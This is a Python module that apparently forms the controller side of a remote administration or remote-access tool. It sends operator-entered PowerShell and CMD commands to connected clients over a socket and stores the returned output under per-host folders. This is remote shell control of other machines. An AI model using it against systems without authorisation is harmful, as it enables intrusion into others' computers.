import os
import time
import socket
import shutil
from termcolor import colored
from threading import Thread
from datetime import datetime

# TODO: FINISHED: logging.
# TODO: Change infinite loop location to inside of cmd commands.


class Freestyle:
    threads = []

    def __init__(self, con, root, tmp_availables, clients, targets, logpath):
        self.con = con
        self.root = root
        self.tmp_availables = tmp_availables
        self.clients = clients
        self.targets = targets
        self.log_path = logpath

    def bytes_to_number(self, b):
        res = 0
        for i in range(4):
            res += b[i] << (i * 8)
        return res

    def freestyle_menu(self):
        self.logIt_thread(self.log_path, debug=False, msg=f'Running freestyle_menu()...')
        print(f"\t\t({colored('1', 'yellow')})Run Powershell Command")
        print(f"\t\t({colored('2', 'yellow')})Run CMD Command")
        print(f"\n\t\t({colored('0', 'yellow')})Back")

        return

    def recv_file(self, text):
        def make_dir():
            self.logIt_thread(self.log_path, debug=False, msg=f'Running make_dir()...')
            self.logIt_thread(self.log_path, debug=False, msg=f'Creating Directory...')
            # Create a directory with host's name if not already exists.
            for item in self.tmp_availables:
                for conKey, ipValue in self.clients.items():
                    for ipKey in ipValue.keys():
                        if item[1] == ipKey:
                            ipval = item[1]
                            host = item[2]
                            user = item[3]
                            path = os.path.join(self.root, host)
                            try:
                                os.makedirs(path)

                            except FileExistsError:
                                self.logIt_thread(self.log_path, debug=False, msg=f'Passing FileExistsError...')
                                pass

                            self.logIt_thread(self.log_path, debug=False, msg=f'Directory created.')

                            return ipval, host, user, path

        def file_name():
            self.logIt_thread(self.log_path, debug=False, msg=f'Running file_name()...')
            try:
                self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for filename from client...')
                filename = self.con.recv(1024)
                self.logIt_thread(self.log_path, debug=False, msg=f'File name: {filename}')

                self.logIt_thread(self.log_path, debug=False, msg=f'Sending confirmation to client...')
                self.con.send("Filename OK".encode())
                self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')

                return filename

            except (WindowsError, socket.error) as e:
                self.logIt_thread(self.log_path, debug=True, msg=f'Error: {e}')
                return False

        def fetch(filename):
            self.logIt_thread(self.log_path, debug=False, msg=f'Running fetch()...')
            try:
                self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for file size...')
                size = self.con.recv(4)
                self.logIt_thread(self.log_path, debug=False, msg=f'File size: {size}')

                self.logIt_thread(self.log_path, debug=False, msg=f'Converting size bytes to numbers...')
                size = self.bytes_to_number(size)
                self.logIt_thread(self.log_path, debug=False, msg=f'Converting completed.')

                current_size = 0
                buffer = b""
                try:
                    self.logIt_thread(self.log_path, debug=False, msg=f'Opening file: {filename} for writing...')
                    with open(filename, 'wb') as file:
                        self.logIt_thread(self.log_path, debug=False, msg=f'Fetching file content...')
                        while current_size < size:
                            data = self.con.recv(1024)
                            if not data:
                                break

                            if len(data) + current_size > size:
                                data = data[:size - current_size]

                            buffer += data
                            current_size += len(data)
                            file.write(data)

                    self.logIt_thread(self.log_path, debug=False, msg=f'Fetch completed.')

                except FileExistsError:
                    self.logIt_thread(self.log_path, debug=False, msg=f'File Exists error.')
                    self.logIt_thread(self.log_path, debug=False, msg=f'Opening {filename} for appends...')
                    with open(filename, 'ab') as file:
                        while current_size < size:
                            self.logIt_thread(self.log_path, debug=False, msg=f'Fetching file content...')
                            data = self.con.recv(1024)
                            if not data:
                                break

                            if len(data) + current_size > size:
                                data = data[:size - current_size]

                            buffer += data
                            current_size += len(data)
                            file.write(data)

                    self.logIt_thread(self.log_path, debug=False, msg=f'Fetch completed.')

            except (WindowsError, socket.error) as e:
                self.logIt_thread(self.log_path, debug=True, msg=f'Error: {e}')
                return False

        def output():
            self.logIt_thread(self.log_path, debug=False, msg=f'Running output()...')
            self.logIt_thread(self.log_path, debug=False, msg=f'Opening {filename} for reading...')
            with open(filename, 'r') as file:
                self.logIt_thread(self.log_path, debug=False, msg=f'Reading file content...')
                data = file.read()
                self.logIt_thread(self.log_path, debug=False, msg=f'Printing file content...')
                print(data)
                self.logIt_thread(self.log_path, debug=False, msg=f'Print completed.')

        def confirm():
            self.logIt_thread(self.log_path, debug=False, msg=f'Running confirm()...')
            try:
                self.logIt_thread(self.log_path, debug=False, msg=f'Sending OK message to client...')
                self.con.send("OK".encode())
                self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')

                self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for answer from client...')
                ans = self.con.recv(1024).decode()
                self.logIt_thread(self.log_path, debug=False, msg=f'Client answer: {ans}')

                self.logIt_thread(self.log_path, debug=False, msg=f'Printing confirmation to screen...')
                print(f"[{colored('V', 'green')}]{ans}")

            except (WindowsError, socket.error) as e:
                self.logIt_thread(self.log_path, debug=False, msg=f'Error: {e}')
                return False

        def move(filename, path):
            self.logIt_thread(self.log_path, debug=False, msg=f'Running move({filename}, {path})...')
            # Move screenshot file to directory
            self.logIt_thread(self.log_path, debug=False, msg=f'Renaming {filename}...')
            filename = str(filename).strip("b'")
            self.logIt_thread(self.log_path, debug=False, msg=f'New filename: {filename}')

            self.logIt_thread(self.log_path, debug=False, msg=f'Capturing {filename} absolute path...')
            src = os.path.abspath(filename)
            self.logIt_thread(self.log_path, debug=False, msg=f'Abs path: {src}')

            self.logIt_thread(self.log_path, debug=False, msg=f'Defining destination...')
            dst = fr"{path}"
            self.logIt_thread(self.log_path, debug=False, msg=f'Destination: {dst}.')

            self.logIt_thread(self.log_path, debug=False, msg=f'Moving file...')
            shutil.move(src, dst)
            self.logIt_thread(self.log_path, debug=False, msg=f'File {filename} moved to {dst}.')

        self.logIt_thread(self.log_path, debug=False, msg=f'Running recv_file()...')
        self.logIt_thread(self.log_path, debug=False, msg=f'Calling make_dir()...')
        ipval, host, user, path = make_dir()

        self.logIt_thread(self.log_path, debug=False, msg=f'Defining filename...')
        filename = file_name()
        self.logIt_thread(self.log_path, debug=False, msg=f'File name: {filename}.')

        self.logIt_thread(self.log_path, debug=False, msg=f'Calling fetch({filename})...')
        fetch(filename)

        self.logIt_thread(self.log_path, debug=False, msg=f'Performing print validation...')
        if text:
            output()

        self.logIt_thread(self.log_path, debug=False, msg=f'Calling confirm()...')
        confirm()

        self.logIt_thread(self.log_path, debug=False, msg=f'Calling move({filename}, {path})')
        move(filename, path)

        self.logIt_thread(self.log_path, debug=False, msg=f'=== End of self.recv() ===')

    def freestyle(self):
        def validate():
            while True:
                self.logIt_thread(self.log_path, debug=False, msg=f'Calling self.freestyle_menu()...')
                self.freestyle_menu()

                try:
                    self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for user input...')
                    choice = int(input("#>"))
                    self.logIt_thread(self.log_path, debug=False, msg=f'User input: {choice}')

                    if choice > 2:
                        self.logIt_thread(self.log_path, debug=False, msg=f'Wrong input detected.')
                        print(f"[{colored('*', 'red')}]Wrong Number. "
                              f"[{colored('1', 'yellow')} - {colored('2', 'yellow')} or {colored('0', 'yellow')}]\n")

                    return choice

                except ValueError:
                    self.logIt_thread(self.log_path, debug=False, msg=f'Wrong value detected.')
                    print(
                        f"[{colored('*', 'red')}]Numbers only. Choose between "
                        f"[{colored('1', 'yellow')} - {colored('3', 'yellow')} or {colored('0', 'yellow')}].\n")

                    continue

        choice = validate()

        # Run Powershell Command
        if int(choice) == 1:
            try:
                self.logIt_thread(self.log_path, debug=False, msg=f'Sending ps command to client...')
                self.con.send("ps".encode())
                self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')

                while True:
                    self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for user input...')
                    cmd = input("PS>")
                    self.logIt_thread(self.log_path, debug=False, msg=f'User input: {cmd}')

                    if str(cmd).lower()[:4] == "back":
                        self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} command to client...')
                        self.con.send("back".encode())
                        self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')

                        self.con.recv(1024).decode()
                        break

                    self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} to client...')
                    self.con.send(cmd.encode())
                    self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')

                    self.logIt_thread(self.log_path, debug=False, msg=f'Sleeping for 1 second...')
                    time.sleep(1)

                    self.logIt_thread(self.log_path, debug=False, msg=f'Calling self.recv_file(text=True)...')
                    self.recv_file(text=True)

            except (WindowsError, socket.error) as e:
                self.logIt_thread(self.log_path, debug=True, msg=f'Error: {e}')
                return False

        # Run CMD Command
        elif int(choice) == 2:
            try:
                self.logIt_thread(self.log_path, debug=False, msg=f'Sending cmd command to client...')
                self.con.send("cmd".encode())
                self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')

                while True:
                    self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for user input...')
                    cmd = input("CMD>")
                    self.logIt_thread(self.log_path, debug=False, msg=f'User input: {cmd}.')

                    if str(cmd).lower()[:4] == "back":
                        self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} command to client...')
                        self.con.send("back".encode())
                        self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')

                        self.con.recv(1024).decode()
                        break

                    self.logIt_thread(self.log_path, debug=False, msg=f'Sending {cmd} to client...')
                    self.con.send(cmd.encode())
                    self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')

                    self.logIt_thread(self.log_path, debug=False, msg=f'Sleeping for 1 second...')
                    time.sleep(1)

                    self.logIt_thread(self.log_path, debug=False, msg=f'Calling self.recv_file(text=True)...')
                    self.recv_file(text=True)

            except (WindowsError, socket.error) as e:
                self.logIt_thread(self.log_path, debug=True, msg=f'Error: {e}.')
                return False

        elif int(choice) == 0:
            self.logIt_thread(self.log_path, debug=False, msg=f'Sending back command to client...')
            self.con.send("back".encode())
            self.logIt_thread(self.log_path, debug=False, msg=f'Send completed.')

            self.logIt_thread(self.log_path, debug=False, msg=f'Waiting for response from client...')
            ans = self.con.recv(1024).decode()
            self.logIt_thread(self.log_path, debug=False, msg=f'Client response: {ans}.')

            return

    def get_date(self):
        d = datetime.now().replace(microsecond=0)
        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))

        return dt

    def logIt(self, logfile=None, debug=None, msg=''):
        dt = self.get_date()
        if debug:
            print(f"{dt}: {msg}")

        if logfile is not None:
            try:
                if not os.path.exists(logfile):
                    with open(logfile, 'w') as lf:
                        lf.write(f"{dt}: {msg}\n")

                    return True

                else:
                    with open(logfile, 'a') as lf:
                        lf.write(f"{dt}: {msg}\n")

                    return True

            except FileExistsError:
                pass

    def logIt_thread(self, log_path=None, debug=True, msg=''):
        self.logit_thread = Thread(target=self.logIt, args=(log_path, debug, msg), name="Log Thread")
        self.logit_thread.start()
        self.threads.append(self.logit_thread)
        return
